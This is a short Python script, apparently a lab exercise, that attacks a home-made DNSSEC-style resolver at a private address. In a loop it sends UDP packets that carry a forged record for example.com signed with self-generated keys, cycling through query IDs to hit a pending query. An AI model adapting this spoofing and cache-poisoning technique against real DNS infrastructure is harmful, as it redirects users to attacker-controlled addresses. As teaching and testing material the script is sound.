import socket
import time
from Cryptodome.PublicKey import RSA
from crypto_functions import sign

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

target = "192.168.56.102"
port = 5053

domain = "example.com"
fake_ip = "6.6.6.6"

fake_ksk = RSA.generate(2048)
fake_zsk = RSA.generate(2048)

print("Attacker running...")

while True:
    for qid in range(1000, 1010):

        record = f"{domain}:{fake_ip}"

        record_sign = sign(record, fake_zsk)

        dnskey = fake_zsk.publickey().export_key().decode() + "|" + fake_ksk.publickey().export_key().decode()
        dnskey_sign = sign(dnskey, fake_ksk)

        msg = "|".join([
            "ROOT",
            str(qid),
            record,
            record_sign,
            dnskey_sign,
            fake_zsk.publickey().export_key().decode(),
            fake_ksk.publickey().export_key().decode()
        ])

        sock.sendto(msg.encode(), (target, port))
        print(f"[ATTACK] QID {qid}")

        time.sleep(0.2)
